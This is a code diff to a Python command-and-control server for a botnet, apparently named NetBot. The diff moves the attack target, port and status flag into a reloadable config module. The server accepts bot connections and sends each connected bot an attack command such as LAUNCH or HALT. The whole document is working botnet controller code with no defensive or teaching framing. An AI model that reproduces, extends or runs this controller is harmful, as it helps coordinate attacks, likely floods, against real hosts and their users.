@@ -13,6 +13,7 @@
 import socket
 import threading
 from termcolor import colored
+from importlib import reload
 
 print (""" ______             ______             
 |  ___ \       _   (____  \       _    
@@ -23,35 +24,21 @@ print (""" ______             ______
                                        """)
 
 
-
-
-
-# Set target and flags.
-def params():
-	ATTACK_TARGET_HOST = "192.168.0.109" # IP address of the machine to be attacked.
-	ATTACK_TARGET_PORT = 80 # Port Number of the machine to be attacked.
-
-#Status codes that has to be set from the below list. 
-		# HALT - To stop attacks immediately.
-		# LAUNCH - To immediately start the attack.
-		# HOLD - Wait for command.
-		# UPDATE - Update Client.
-
-	ATTACK_STATUS = "LAUNCH" # Choose any one Flag from above
-	
-	return ATTACK_STATUS
+def config():
+	import netbot_config
+	netbot_config = reload(netbot_config)
+	return netbot_config.ATTACK_STATUS
 	 
 
 def threaded(c):
 	while True:
 		data = c.recv(1024)
 		if not data:
-			#print('\x1b[0;30;41m' + 'Bot is Offline!' + '\x1b[0m')
 			print('\x1b[0;30;41m' + 'Bot is Offline!' + '\x1b[0m',' Disconnected from CCC :', c.getpeername()[0], ':', c.getpeername()[1])
 			break
-		c.send(params().encode())
+		c.send(config().encode())
 
-	#c.close()
+	#c.close() #No issues commented earlier.
 
 
 def Main():
@@ -64,11 +51,10 @@ def Main():
 	while True:
 
 		c, addr = s.accept()
-		#print('\x1b[0;30;42m' + 'Bot is Online!' + '\x1b[0m')
 		print('\x1b[0;30;42m' + 'Bot is Online!' + '\x1b[0m',' Connected to CCC :', addr[0], ':', addr[1])
 
 		threading.Thread(target=threaded, args=(c,)).start()
-	s.close()
+	#s.close() #No issues uncommented earlier.
 
 
 if __name__ == '__main__':
